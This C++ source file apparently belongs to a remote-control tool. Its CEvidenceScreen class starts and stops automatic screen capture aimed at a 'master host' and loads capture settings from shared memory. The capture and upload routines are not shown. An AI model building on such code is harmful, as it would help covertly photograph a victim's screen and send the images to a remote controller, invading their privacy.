#include "StdAfx.h"
#include "KernelManager.h"
#include "EvidenceScreen.h"
#include "until.h"


//const TCHAR *m_szAutoScrren="AutoCreenCap";

CEvidenceScreen::CEvidenceScreen(void)
{
	m_pFtp=new AUTOSREECNCONFIG;
 	m_bWorking = FALSE;
}


CEvidenceScreen::~CEvidenceScreen(void)
{
	StopWork();
}

BOOL CEvidenceScreen::StartWork()
{

	if (!m_pFtp)
	{
		return FALSE;
	}

// 	HANDLE	hEvent=OpenEvent(EVENT_ALL_ACCESS,FALSE,m_szAutoScrren);
// 	if (hEvent)
// 	{
// 		SetEvent(hEvent);
// 		CloseHandle(hEvent);
// 		Sleep(2000);
// 	}
	//_asm int 3
	StartAutoSreen(m_pFtp,CKernelManager::m_strMasterHost,1);
	m_bWorking = TRUE;
	return TRUE;
}


BOOL CEvidenceScreen::StopWork()
{

	StopAutoScreen();
	delete m_pFtp;
	m_bWorking = FALSE;


	return TRUE;
}


// BOOL CEvidenceScreen::GetScreenState()
// {
// 
// 	HANDLE hEvent =OpenEvent(EVENT_ALL_ACCESS, FALSE,m_szAutoScrren);
// 	if (hEvent)
// 	{
// 		CloseHandle(hEvent);
// 		return FALSE;
// 	}
// 	return TRUE;
// }

BOOL CEvidenceScreen::SetScreenCmdLine(LPVOID pFtp)
{
	if (pFtp)
		memcpy((char*)m_pFtp,(char*)pFtp,sizeof(AUTOSREECNCONFIG));
	return TRUE;
}

void CEvidenceScreen::GetScreenInfo(pFTPCONFIG pFtpconfig)
{

	pFTPCONFIG ptmp;
	ptmp=(pFTPCONFIG)GetShareMem("FTPCofigMemShare");
	if (ptmp)
	{
		pFtpconfig->m_nScrBitCount=ptmp->m_nScrBitCount;
		pFtpconfig->m_nScrTimeInternal=ptmp->m_nScrTimeInternal;
	}
}
